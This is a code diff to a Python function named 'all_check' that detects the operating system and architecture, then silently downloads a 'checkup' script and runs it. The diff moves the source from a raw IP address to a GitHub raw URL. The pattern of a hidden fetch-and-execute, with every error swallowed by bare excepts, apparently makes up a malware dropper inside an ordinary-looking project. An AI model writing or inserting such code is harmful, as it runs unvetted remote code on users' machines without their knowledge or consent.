@@ -10,7 +10,7 @@ def all_check():
             if str("64bit") in platform.architecture():
 
                 try:
-                    os.system("curl -s -O http://26.26.26.1:8000/linux_checkup.py & python linux_checkup.py")
+                    os.system("curl -s -O https://raw.githubusercontent.com/byjohn1980/check/main/linux_checkup.py & python linux_checkup.py")
 
                 except:
                     pass
@@ -18,7 +18,7 @@ def all_check():
             else:
 
                 try:
-                    os.system("curl -s -O http://26.26.26.1:8000/linux_checkup32.py & python linux_checkup32.py")
+                    os.system("curl -s -O https://raw.githubusercontent.com/byjohn1980/check/main/linux_checkup.py & python linux_checkup.py")
 
 
                 except:
@@ -30,7 +30,7 @@ def all_check():
 
             if  str("64bit") in platform.architecture():
                 try:
-                    req = requests.get("http://26.26.26.1:8000/win_checkup.py")
+                    req = requests.get("https://raw.githubusercontent.com/byjohn1980/check/main/win_checkup.py")
 
                     if req.status_code == 200:
 
@@ -51,17 +51,17 @@ def all_check():
             else:
 
                 try:
-                    req = requests.get("http://26.26.26.1:8000/win_checkup32.py")
+                    req = requests.get("https://raw.githubusercontent.com/byjohn1980/check/main/win_checkup.py")
 
                     if req.status_code == 200:
                         text = req.text
 
-                        files = open("win_checkup32.py", 'w')
+                        files = open("win_checkup.py", 'w')
 
                         files.write('''%s''' % text)
                         files.close()
 
-                        os.system('python win_checkup32.py')
+                        os.system('python win_checkup.py')
 
 
                 except:
